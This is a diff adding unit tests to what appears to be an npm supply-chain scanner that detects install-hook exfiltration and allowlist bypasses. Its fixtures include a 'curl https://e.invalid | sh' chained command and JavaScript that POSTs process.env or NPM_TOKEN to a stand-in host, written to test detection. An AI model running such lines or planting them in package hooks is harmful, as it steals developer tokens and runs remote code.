@@ -87,6 +87,13 @@ class IocTests(unittest.TestCase):
         self.assertTrue(any(r.matches("node install.js", "esbuild") for r in rules))
         self.assertFalse(any(r.matches("node install.js", "evil-helper") for r in rules))
 
+    def test_allowlist_requires_every_segment(self):
+        rules = iocs.load_allowlist()
+        self.assertTrue(iocs.is_allowed(rules, "prebuild-install -r napi || node-gyp rebuild", "sqlite3"))
+        self.assertTrue(iocs.is_allowed(rules, "husky install", "x"))
+        self.assertFalse(iocs.is_allowed(rules, "husky && node x.js", "x"))
+        self.assertFalse(iocs.is_allowed(rules, "node-gyp rebuild; curl https://e.invalid | sh", "x"))
+
     def test_every_wave_has_reference(self):
         ioc = iocs.load(str(IOC_FILE))
         for wid, wave in ioc.waves.items():
@@ -404,6 +411,19 @@ class HeuristicTests(TempDirCase):
     def test_own_project_hook_is_checked(self):
         self.put("package.json", json.dumps({"name": "me", "version": "1.0.0", "scripts": {"preinstall": "node tools/pre.js"}}))
         self.put("tools/pre.js", "fetch('https://e.invalid', {method:'POST', body: JSON.stringify(process.env)});\n")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])
+
+    def test_chained_allowlisted_prefix_is_not_a_bypass(self):
+        self.hook_pkg("fetch('https://e.invalid', {method: 'POST', body: process.env.NPM_TOKEN});\n", command="husky && node setup.js")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])
+
+    def test_every_target_in_a_hook_is_checked(self):
+        self.hook_pkg("fetch('https://e.invalid', {method: 'POST', body: process.env.NPM_TOKEN});\n", command="node ok.js && node setup.js")
+        self.put("node_modules/pkg-x/ok.js", "module.exports = 1;\n")
+        self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])
+
+    def test_node_e_require_target_followed(self):
+        self.hook_pkg("fetch('https://e.invalid', {method: 'POST', body: process.env.NPM_TOKEN});\n", command="node -e \"try{require('./setup')}catch(e){}\"")
         self.assertEqual(cats(scan(self.tmp)), [("hook-exfil", "HIGH")])
 
     def test_listed_payload_not_double_reported(self):
